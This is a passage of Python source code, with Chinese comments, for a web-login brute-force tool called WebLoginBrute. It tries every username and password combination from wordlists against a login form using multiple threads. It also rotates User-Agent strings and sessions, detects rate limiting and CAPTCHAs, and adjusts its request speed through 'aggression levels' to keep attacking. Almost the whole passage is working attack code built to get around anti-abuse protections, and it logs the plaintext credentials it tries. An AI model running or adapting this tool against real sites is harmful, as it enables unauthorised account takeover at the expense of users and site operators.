            'A2': {  # 激进模式 - 高对抗
                'rate_limit_detection': True,
                'captcha_detection': True,
                'adaptive_rate_control': True,
                'session_rotation': True,
                'delay_between_requests': 1.0,
                'max_concurrent_requests': 3,
                'retry_on_failure': True,
                'exponential_backoff': True
            },
            'A3': {  # 极限模式 - 最高对抗
                'rate_limit_detection': True,
                'captcha_detection': True,
                'adaptive_rate_control': True,
                'session_rotation': True,
                'delay_between_requests': 2.0,
                'max_concurrent_requests': 2,
                'retry_on_failure': True,
                'exponential_backoff': True,
                'session_lifetime': 60,  # 短会话生命周期
                'max_retries': 5
            }
        }
        
        if self.aggression_level not in aggression_configs:
            logging.warning(f"未知的对抗级别 {self.aggression_level}，使用默认A1级别")
            self.aggression_level = 'A1'
        
        config = aggression_configs[self.aggression_level]
        for key, value in config.items():
            setattr(self, key, value)
        
        logging.info(f"对抗级别设置为: {self.aggression_level}")

    def _cleanup_memory(self):
        """清理内存，优化性能"""
        current_time = time.time()
        
        # 限制清理频率，避免过度清理
        if current_time - self._last_memory_cleanup < self._memory_cleanup_interval:
            return
        
        try:
            # 清理DNS缓存
            with self._dns_cache_lock:
                if len(self._dns_cache) > 1000:  # 限制缓存大小
                    # 保留最近使用的1000个条目
                    items = list(self._dns_cache.items())
                    self._dns_cache = dict(items[-1000:])
            
            # 清理会话池
            with self.session_pool_lock:
                current_time = time.time()
                expired_sessions = []
                for username, session_info in self.session_pool.items():
                    if current_time - session_info['created_time'] > self.session_lifetime:
                        expired_sessions.append(username)
                
                for username in expired_sessions:
                    try:
                        self.session_pool[username]['session'].close()
                    except Exception:
                        pass
                    del self.session_pool[username]
                
                if expired_sessions:
                    logging.debug(f"清理了 {len(expired_sessions)} 个过期会话")
            
            # 清理请求时间记录
            with self.rate_limit_lock:
                current_time = time.time()
                while self.request_times and current_time - self.request_times[0] > 60:
                    self.request_times.popleft()
            
            # 更新性能统计
            if self._psutil_available:
                try:
                    import psutil
                    process = psutil.Process()
                    memory_info = process.memory_info()
                    current_memory = memory_info.rss / 1024 / 1024  # MB
                    
                    if current_memory > self.performance['peak_memory_usage']:
                        self.performance['peak_memory_usage'] = current_memory
                    
                    # 如果内存使用过高，强制垃圾回收
                    if current_memory > 500:  # 500MB阈值
                        import gc
                        gc.collect()
                        logging.debug("执行强制垃圾回收")
                except Exception:
                    pass
            
            self._last_memory_cleanup = current_time
            self.performance['memory_cleanup_count'] += 1
            
        except Exception as e:
            logging.warning(f"内存清理失败: {e}")

    def update_stats(self, stat_type):
        """线程安全地更新统计信息"""
        with self.lock:
            if stat_type in self.stats:
                self.stats[stat_type] += 1
            else:
                logging.warning(f"未知的统计类型: {stat_type}")

    def _update_performance_metrics(self, response_time):
        """更新性能指标"""
        with self.lock:
            self.performance['total_response_time'] += response_time
            self.performance['response_count'] += 1
            self.performance['avg_response_time'] = (
                self.performance['total_response_time'] / self.performance['response_count']
            )

    def _adjust_rate_control(self, success=True):
        """调整速率控制参数"""
        if not self.enable_adaptive_rate_control:
            return
        
        current_time = time.time()
        
        with self.rate_limit_lock:
            if success:
                self.adaptive_rate_stats['consecutive_successes'] += 1
                self.adaptive_rate_stats['consecutive_errors'] = 0
                
                # 连续成功时适当提高速率
                if (self.adaptive_rate_stats['consecutive_successes'] >= 
                    self.adaptive_rate_stats['rate_adjustment_threshold']):
                    if (current_time - self.adaptive_rate_stats['last_rate_adjustment'] > 30 and
                        self.adaptive_rate_stats['current_rate_multiplier'] < 
                        self.adaptive_rate_stats['max_rate_multiplier']):
                        
                        self.adaptive_rate_stats['current_rate_multiplier'] = min(
                            self.adaptive_rate_stats['current_rate_multiplier'] * 1.1,
                            self.adaptive_rate_stats['max_rate_multiplier']
                        )
                        self.adaptive_rate_stats['last_rate_adjustment'] = current_time
                        logging.debug(f"提高请求速率: {self.adaptive_rate_stats['current_rate_multiplier']:.2f}x")
            else:
                self.adaptive_rate_stats['consecutive_errors'] += 1
                self.adaptive_rate_stats['consecutive_successes'] = 0
                
                # 连续失败时降低速率
                if (self.adaptive_rate_stats['consecutive_errors'] >= 3 or
                    self.adaptive_rate_stats['immediate_rate_reduction']):
                    
                    self.adaptive_rate_stats['current_rate_multiplier'] = max(
                        self.adaptive_rate_stats['current_rate_multiplier'] * 0.5,
                        self.adaptive_rate_stats['min_rate_multiplier']
                    )
                    self.adaptive_rate_stats['last_rate_adjustment'] = current_time
                    self.adaptive_rate_stats['immediate_rate_reduction'] = False
                    logging.debug(f"降低请求速率: {self.adaptive_rate_stats['current_rate_multiplier']:.2f}x")

    def _detect_rate_limiting(self, response):
        """检测频率限制"""
        if not response:
            return False
        
        # 检查HTTP状态码
        if response.status_code in [429, 503, 403]:
            return True
        
        # 检查响应头中的频率限制信息
        rate_limit_headers = [
            'x-ratelimit-remaining',
            'x-ratelimit-reset',
            'retry-after',
            'x-rate-limit-remaining'
        ]
        
        for header in rate_limit_headers:
            if header in response.headers:
                return True
        
        # 检查响应内容中的频率限制关键词
        if response.text:
            rate_limit_keywords = [
                'rate limit', 'rate limiting', 'too many requests',
                '请求过于频繁', '访问频率过高', '请稍后再试'
            ]
            
            response_lower = response.text.lower()
            for keyword in rate_limit_keywords:
                if keyword in response_lower:
                    return True
        
        return False

    def _handle_rate_limiting(self, username, password):
        """处理频率限制"""
        self.update_stats('rate_limited')
        logging.warning(f"检测到频率限制: {username}:{password}")
        
        # 记录到审计日志
        audit_logger = logging.getLogger('audit')
        audit_logger.warning(f"频率限制检测 - 用户: {SecurityManager.hash_sensitive_data(username)}")
        
        # 设置立即降速标志
        self.adaptive_rate_stats['immediate_rate_reduction'] = True
        
        # 根据对抗级别决定等待时间
        wait_time = {
            'A0': 1,
            'A1': 5,
            'A2': 10,
            'A3': 30
        }.get(self.aggression_level, 5)
        
        logging.info(f"等待 {wait_time} 秒后继续...")
        time.sleep(wait_time)

    def _detect_captcha(self, response):
        """检测验证码"""
        if not response or not response.text:
            return False
        
        # 检查响应内容中的验证码关键词
        captcha_keywords = [
            'captcha', '验证码', 'recaptcha', '验证图片',
            '请输入验证码', 'captcha required', 'human verification'
        ]
        
        response_lower = response.text.lower()
        for keyword in captcha_keywords:
            if keyword in response_lower:
                return True
        
        # 检查HTML中的验证码元素
        try:
            soup = BeautifulSoup(response.text, 'html.parser')
            captcha_elements = soup.find_all(['img', 'div', 'input'], 
                                           {'id': re.compile(r'captcha|验证码', re.I)})
            if captcha_elements:
                return True
        except Exception:
            pass
        
        return False

    def _handle_captcha(self, username, password):
        """处理验证码"""
        self.update_stats('captcha_detected')
        logging.warning(f"检测到验证码: {username}:{password}")
        
        # 记录到审计日志
        audit_logger = logging.getLogger('audit')
        audit_logger.warning(f"验证码检测 - 用户: {SecurityManager.hash_sensitive_data(username)}")
        
        # 根据对抗级别决定处理策略
        if self.aggression_level in ['A0', 'A1']:
            logging.info("跳过验证码，继续下一个组合")
        else:
            logging.info("遇到验证码，暂停攻击")
            time.sleep(5)  # 暂停5秒

    def run(self):
        """主运行方法"""
        # 设置日志
        self.setup_logger()
        self._setup_audit_logger()
        
        # 预解析目标
        self._pre_resolve_targets()
        
        # 验证配置
        self._validate_config()
        
        # 加载字典
        usernames = list(self.load_wordlist(self.config.username_file))
        passwords = list(self.load_wordlist(self.config.password_file))
        
        logging.info(f"加载了 {len(usernames)} 个用户名和 {len(passwords)} 个密码")
        
        # 检查恢复点
        if self.config.resume:
            self._load_progress()
        
        # 设置线程池
        max_workers = getattr(self, 'max_concurrent_requests', 5)
        self.executor = ThreadPoolExecutor(max_workers=max_workers, thread_name_prefix="WebLoginBrute")
        
        # 记录开始时间
        self.stats['start_time'] = time.time()
        
        try:
            # 开始暴力破解
            self._brute_force(usernames, passwords)
        except KeyboardInterrupt:
            logging.info("用户中断操作")
        except Exception as e:
            logging.error(f"运行过程中发生错误: {e}")
        finally:
            # 清理资源
            self._cleanup()
            self.stats['end_time'] = time.time()
            self._print_final_stats()

    def _validate_config(self):
        """验证配置"""
        # 基本配置验证
        if not hasattr(self.config, 'form_url') or not self.config.form_url:
            raise ConfigurationError("缺少表单URL配置")
        
        if not hasattr(self.config, 'submit_url') or not self.config.submit_url:
            raise ConfigurationError("缺少提交URL配置")
        
        if not hasattr(self.config, 'username_file') or not self.config.username_file:
            raise ConfigurationError("缺少用户名文件配置")
        
        if not hasattr(self.config, 'password_file') or not self.config.password_file:
            raise ConfigurationError("缺少密码文件配置")
        
        # 文件存在性验证
        if not os.path.exists(self.config.username_file):
            raise ConfigurationError(f"用户名文件不存在: {self.config.username_file}")
        
        if not os.path.exists(self.config.password_file):
            raise ConfigurationError(f"密码文件不存在: {self.config.password_file}")
        
        # URL安全性验证
        if not SecurityManager.validate_url(self.config.form_url):
            raise SecurityError(f"不安全的表单URL: {self.config.form_url}")
        
        if not SecurityManager.validate_url(self.config.submit_url):
            raise SecurityError(f"不安全的提交URL: {self.config.submit_url}")
        
        logging.info("配置验证通过")

    def _load_progress(self):
        """加载进度"""
        if not os.path.exists(self.progress_file):
            logging.info("未找到进度文件，从头开始")
            return
        
        try:
            with open(self.progress_file, 'r', encoding='utf-8') as f:
                progress_data = json.load(f)
                
            # 恢复尝试过的组合
            if 'attempted_combinations' in progress_data:
                self.attempted_combinations_set = set(progress_data['attempted_combinations'])
                logging.info(f"恢复了 {len(self.attempted_combinations_set)} 个已尝试的组合")
            
            # 恢复统计信息
            if 'stats' in progress_data:
                self.stats.update(progress_data['stats'])
                logging.info("恢复了统计信息")
                
        except Exception as e:
            logging.warning(f"加载进度失败: {e}")

    def _save_progress(self):
        """保存进度"""
        try:
            progress_data = {
                'attempted_combinations': list(self.attempted_combinations_set),
                'stats': self.stats,
                'timestamp': time.time()
            }
            
            with open(self.progress_file, 'w', encoding='utf-8') as f:
                json.dump(progress_data, f, ensure_ascii=False, indent=2)
                
        except Exception as e:
            logging.error(f"保存进度失败: {e}")

    def _brute_force(self, usernames, passwords):
        """执行暴力破解"""
        total_combinations = len(usernames) * len(passwords)
        logging.info(f"开始暴力破解，总共 {total_combinations} 个组合")
        
        # 检查executor是否已初始化
        if not self.executor:
            logging.error("线程池未初始化")
            return
        
        # 生成组合
        combinations = product(usernames, passwords)
        
        # 过滤已尝试的组合
        filtered_combinations = []
        for combo in combinations:
            if combo not in self.attempted_combinations_set:
                filtered_combinations.append(combo)
        
        logging.info(f"过滤后剩余 {len(filtered_combinations)} 个组合")
        
        # 提交任务到线程池
        futures = []
        for username, password in filtered_combinations:
            if self.success.is_set():
                break
            
            future = self.executor.submit(self._try_login, username, password)
            futures.append(future)
            
            # 控制并发数量
            if len(futures) >= getattr(self, 'max_concurrent_requests', 5):
                self._wait_for_futures(futures)
                futures = []
        
        # 等待剩余任务完成
        if futures:
            self._wait_for_futures(futures)

    def _wait_for_futures(self, futures):
        """等待futures完成"""
        for future in as_completed(futures):
            try:
                result = future.result()
                if result:
                    self.success.set()
                    break
            except Exception as e:
                logging.error(f"任务执行失败: {e}")

    def _try_login(self, username, password):
        """尝试登录"""
        # 检查是否已成功
        if self.success.is_set():
            return False
        
        # 检查频率限制
        if not self._check_rate_limit():
            time.sleep(1)
            return False
        
        # 获取或创建会话
        session = self._get_session(username)
        
        try:
            # 获取token和检测防护
            response, token = self._get_token_and_detect_protection(session, username, password)
            if not response:
                return False
            
            # 准备登录数据
            login_data = self._prepare_login_data(username, password, token)
            
            # 发送登录请求
            headers = {"User-Agent": random.choice(USER_AGENTS)}
            submit_url = getattr(self.config, 'submit_url', None)
            if not submit_url:
                logging.error("缺少提交URL配置")
                return False
                
            response = self._make_request_with_retry(
                session, 'POST', submit_url,
                data=login_data, headers=headers, timeout=self.config.timeout
            )
            
            # 检查登录结果
            if self._check_login_success(response, username, password):
                self.success.set()
                self._cleanup_on_exit = True  # 成功时清理进度文件
                return True
            
            # 记录失败
            self.update_stats('total_attempts')
            self._add_attempted_combination((username, password))
            
            # 定期保存进度
            if self.stats['total_attempts'] % 100 == 0:
                self._save_progress()
            
            return False
            
        except Exception as e:
            logging.error(f"登录尝试失败 {username}:{password} - {e}")
            self.update_stats('other_errors')
            return False

    def _get_session(self, username):
        """获取或创建会话"""
        with self.session_pool_lock:
            if username in self.session_pool:
                session_info = self.session_pool[username]
                # 检查会话是否过期
                if time.time() - session_info['created_time'] < self.session_lifetime:
                    return session_info['session']
                else:
                    # 清理过期会话
                    try:
                        session_info['session'].close()
                    except Exception:
                        pass
                    del self.session_pool[username]
            
            # 创建新会话
            session = requests.Session()
            
            # 设置会话属性
            session.max_redirects = 5  # 限制重定向次数
            
            # 设置cookies
            if hasattr(self.config, 'cookie_file') and self.config.cookie_file:
                try:
                    cookie_jar = cookielib.MozillaCookieJar(self.config.cookie_file)
                    cookie_jar.load()
                    # 将MozillaCookieJar转换为RequestsCookieJar
                    for cookie in cookie_jar:
                        session.cookies.set_cookie(cookie)
                except Exception as e:
                    logging.warning(f"加载cookies失败: {e}")
            
            # 存储会话信息
            self.session_pool[username] = {
                'session': session,
                'created_time': time.time()
            }
            
            # 限制会话池大小
            if len(self.session_pool) > self.max_session_pool_size:
                # 移除最旧的会话
                oldest_username = min(self.session_pool.keys(), 
                                    key=lambda k: self.session_pool[k]['created_time'])
                try:
                    self.session_pool[oldest_username]['session'].close()
                except Exception:
                    pass
                del self.session_pool[oldest_username]
            
            return session

    def _check_login_success(self, response, username, password):
        """检查登录是否成功"""
        # 检查HTTP状态码
        if response.status_code == 200:
            # 检查响应内容中的成功/失败关键词
            response_lower = response.text.lower()
            
            success_keywords = ['welcome', 'dashboard', 'logout', 'profile', 'success']
            failure_keywords = ['invalid', 'incorrect', 'failed', 'error', 'login']
            
            success_count = sum(1 for keyword in success_keywords if keyword in response_lower)
            failure_count = sum(1 for keyword in failure_keywords if keyword in response_lower)
            
            if success_count > failure_count:
                logging.info(f"登录成功: {username}:{password}")
                self.update_stats('successful_attempts')
                
                # 记录到审计日志
                audit_logger = logging.getLogger('audit')
                audit_logger.info(f"登录成功 - 用户: {SecurityManager.hash_sensitive_data(username)}")
                
                return True
        
        return False

    def _print_final_stats(self):
        """打印最终统计信息"""
        duration = self.stats['end_time'] - self.stats['start_time']
        
        print("\n" + "="*50)
        print("暴力破解完成")
        print("="*50)
        print(f"总尝试次数: {self.stats['total_attempts']}")
        print(f"成功次数: {self.stats['successful_attempts']}")
        print(f"超时错误: {self.stats['timeout_errors']}")
        print(f"连接错误: {self.stats['connection_errors']}")
        print(f"HTTP错误: {self.stats['http_errors']}")
        print(f"其他错误: {self.stats['other_errors']}")
        print(f"重试次数: {self.stats['retry_attempts']}")
        print(f"频率限制: {self.stats['rate_limited']}")
        print(f"验证码检测: {self.stats['captcha_detected']}")
        print(f"总耗时: {duration:.2f} 秒")
        print(f"平均响应时间: {self.performance['avg_response_time']:.3f} 秒")
        print(f"峰值内存使用: {self.performance['peak_memory_usage']:.1f} MB")
        print(f"内存清理次数: {self.performance['memory_cleanup_count']}")
        print("="*50)


def parse_args():
    """解析命令行参数 - 修复版本"""
    parser = argparse.ArgumentParser(description="Web登录暴力破解工具 - 坚韧版 v0.0.14")
    
    # 必需参数
    parser.add_argument("--form-url", required=True, help="登录表单URL")
    parser.add_argument("--submit-url", required=True, help="登录提交URL")
    parser.add_argument("--username-file", required=True, help="用户名字典文件")
    parser.add_argument("--password-file", required=True, help="密码字典文件")
    
    # 可选参数
    parser.add_argument("--csrf", required=False, default=None, help="CSRF token字段名（如目标无CSRF token可省略）")
    parser.add_argument("--login-field", help="额外的登录字段名")
    parser.add_argument("--login-value", help="额外的登录字段值")
    parser.add_argument("--cookie-file", help="Cookie文件路径")
    parser.add_argument("--timeout", type=int, default=30, help="请求超时时间（秒）")
    parser.add_argument("--threads", type=int, default=5, help="并发线程数")
    parser.add_argument("--resume", action="store_true", help="从上次中断的地方继续")
    parser.add_argument("--progress-file", default="bruteforce_progress.json", help="进度文件路径")
    parser.add_argument("--aggression-level", choices=['A0', 'A1', 'A2', 'A3'], default='A1', 
                       help="对抗级别（A0=静默，A1=标准，A2=激进，A3=极限）")
    parser.add_argument("--dry-run", action="store_true", help="测试模式，不实际发送请求")
    parser.add_argument("--verbose", action="store_true", help="详细输出")
    
    return parser.parse_args()


def main():
    """主函数"""
    try:
        args = parse_args()
        
        # 创建WebLoginBrute实例
        weblogin_brute = WebLoginBrute(args)
        
        # 运行暴力破解
        weblogin_brute.run()
        
    except KeyboardInterrupt:
        print("\n[!] 用户中断操作")
        sys.exit(1)
    except Exception as e:
        print(f"[!] 程序执行失败: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
